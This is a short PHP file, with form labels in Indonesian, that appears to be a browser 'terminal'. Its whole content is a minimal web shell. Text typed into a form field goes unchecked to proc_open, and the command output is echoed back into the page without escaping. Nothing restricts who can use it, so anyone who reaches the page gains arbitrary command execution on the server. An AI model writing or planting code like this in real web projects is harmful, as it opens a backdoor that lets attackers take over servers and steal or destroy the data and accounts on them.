
<form id="terminalForm" method="post" action="">
    Masukkan kode terminal: <br>
    <input type="text" name="command" id="command" autocomplete="off"><br>
    <input type="submit" name="submit" value="Jalankan">
</form>

<?php
if (isset($_POST['submit'])) {
    $command = $_POST['command'];
    echo "<h2>Hasil Eksekusi:</h2>";
    
    // Membuka proses dengan proc_open
    $descriptors = array(
        0 => array("pipe", "r"), // stdin
        1 => array("pipe", "w"), // stdout
        2 => array("pipe", "w"), // stderr
    );
    
    $process = proc_open($command, $descriptors, $pipes);
    
    if (is_resource($process)) {
        // Menulis input ke stdin
        fwrite($pipes[0], "y\n"); // Misalnya, mengirim "y" sebagai input
        
        fclose($pipes[0]);
        
        // Membaca output dari stdout dan stderr
        $output = stream_get_contents($pipes[1]);
        $error = stream_get_contents($pipes[2]);
        
        fclose($pipes[1]);
        fclose($pipes[2]);
        
        // Menunggu proses selesai
        $status = proc_close($process);
        
        // Menampilkan output
        echo "<pre>$output</pre>";
        if ($error) {
            echo "<pre style='color:red;'>$error</pre>";
        }
    } else {
        echo "Gagal membuka proses.";
    }
}
?>